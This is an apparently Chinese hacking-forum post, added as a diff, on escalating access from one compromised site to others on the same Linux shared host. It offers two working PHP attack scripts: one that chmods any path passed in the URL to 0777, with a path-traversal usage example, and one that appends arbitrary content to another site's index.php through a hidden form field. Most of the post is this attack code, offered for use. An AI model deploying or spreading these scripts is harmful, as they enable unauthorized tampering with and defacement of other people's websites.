@@ -1,0 +1,93 @@
+D0000D发往论坛板块-------------------------------------------------------
+No2  号板块  技术文章
+D8888D贴子标题-------------------------------------------------------
+linux下用webshell对文件权限的修改
+D8888D主贴内容-------------------------------------------------------
+yesu（[url=http://hi.baidu.com/3hack_yesu/]链接标记http://hi.baidu.com/3hack_yesu/[/url])
+
+当我们拥有了一个linux下的shell（服务器上多个网站）。
+
+这个shell对所在站点的根目录有可写入权限，甚至能查看其他网站的目录。
+
+那么，这样的主机设置肯定是不安全的。
+
+有的时候，我们想对获得同服务器的其他站的权限，比如直接对其他站点的index.php进行修改，却发现没有权限。
+
+我们可以尝试通过以下脚本来实现对其他站点的文件添加权限。
+
+代码： <?php
+
+$path = stripslashes($_GET['path']);
+
+$ok = chmod ($path , 0777);
+
+if ($ok == true)
+
+echo " CHMOD OK , Permission editable file or directory. Permission to write";
+
+?>
+复制代码保存为chmod.PHP
+
+使用方法简单，访问
+
+http://site/chmod.php?path=../../其他站点的目录/index.php
+
+这里的index.PHP是要修改权限的文件。
+
+
+另外一个exploit：
+
+把下面的代码保存为exploit.PHP
+
+代码： <?php
+
+
+
+         @$filename = stripslashes($_POST['filename']);
+
+         @$mess = stripslashes($_POST['mess']);   
+
+     $fp = @fopen("{$_POST['filename']}", 'a');
+
+         @fputs($fp,"$mess <hr size=\"1\" color=\"black\">");
+
+         @fclose($fp);
+
+?> 
+
+
+
+<form name="form1" action="exploit.php" method="post">
+
+<p align="center"><b>
+
+<br>
+
+CODE :<br>
+
+<textarea name="mess" rows="3"></textarea></font></b></textarea>
+
+</font></b> <p><input type="hidden" name="filename" value="../../AUTRE WEBSITE SUR LE MULTIHOSTING/index.php"></p>
+
+<center>
+
+<input type="reset" name="Submit" value="Delete">
+
+<input name="go" type="submit" value="Send" onClick="javascript:this.style.visibility ='hidden';">
+
+<center>
+
+</form>
+
+<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1">
+
+<title>Changing CHMOD Permissions Exploit - Contact : the_gl4di4t0r[AT]hotmail[DOT]com</title>
+
+</head>
+
+<body>
+
+</center>
+
+</body>
+复制代码
